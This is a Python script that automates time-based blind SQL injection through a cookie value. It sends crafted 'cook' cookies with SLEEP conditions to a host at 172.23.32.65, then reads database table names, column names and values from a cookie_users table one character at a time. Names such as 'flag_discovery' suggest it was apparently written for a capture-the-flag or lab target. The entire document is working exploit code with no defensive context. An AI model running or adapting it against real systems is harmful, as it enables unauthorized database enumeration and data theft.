import time

import requests

def send_table_discovery_injection(url, start_offset, end_offset, headers):
    for charval in range(1, 60):
        for offset in range(start_offset, end_offset + 1):
            dynamic_cookie = f"cook=4'AND (SELECT 1 FROM (SELECT(IF(ASCII(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1), {charval}, {charval}))={offset}, SLEEP(3), 0))) AS injectalias) AND '1'='1 #"
            headers['Cookie'] = dynamic_cookie
            start_time = time.time()
            response = requests.post(url, headers=headers)
            end_time = time.time()
            elapsed_time = end_time - start_time
            if elapsed_time > 3:
                print(chr(offset), sep=' ', end='', flush=True)

def send_column_discovery_injection(url, start_offset, end_offset, headers, entity_offset):
    for charval in range(1, 60):
        for offset in range(start_offset, end_offset + 1):
            dynamic_cookie = f"cook=4'AND (SELECT 1 FROM (SELECT(IF(ASCII(substring((SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%ook%' limit {entity_offset},{entity_offset + 1}), {charval}, {charval}))={offset}, SLEEP(3), 0))) AS injectalias) AND '1'='1 #"
            headers['Cookie'] = dynamic_cookie
            start_time = time.time()
            response = requests.post(url, headers=headers)
            end_time = time.time()
            elapsed_time = end_time - start_time
            if elapsed_time > 3:
                print(chr(offset), sep=' ', end='', flush=True)

def send_flag_discovery_injection(url, start_offset, end_offset, headers, entity_offset):
    for charval in range(1, 60):
        for offset in range(start_offset, end_offset + 1):
            dynamic_cookie = f"cook=4'AND (SELECT 1 FROM (SELECT(IF(ASCII(substring((SELECT name FROM cookie_users WHERE id>100 limit {entity_offset},{entity_offset + 1}), {charval}, {charval}))={offset}, SLEEP(5), 0))) AS injectalias) AND '1'='1 #"
            headers['Cookie'] = dynamic_cookie
            start_time = time.time()
            response = requests.post(url, headers=headers)
            end_time = time.time()
            elapsed_time = end_time - start_time
            if elapsed_time > 5:
                print(chr(offset), sep=' ', end='', flush=True)

if __name__ == "__main__":
    url = "http://172.23.32.65"
    headers = {
        'Host': '172.23.32.65',
        'Accept-Language': 'en-US,en;q=0.9',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }
    MAX_ASCII = 32
    LATIN_ASCII = 97
    END_ASCII = 127
    #send_table_discovery_injection(url, MAX_ASCII, END_ASCII, headers)
    #send_column_discovery_injection(url, MAX_ASCII, END_ASCII, headers, 0)
    #print("\n")
    #send_column_discovery_injection(url, MAX_ASCII, END_ASCII, headers, 1)
    send_flag_discovery_injection(url, MAX_ASCII, END_ASCII, headers, 0)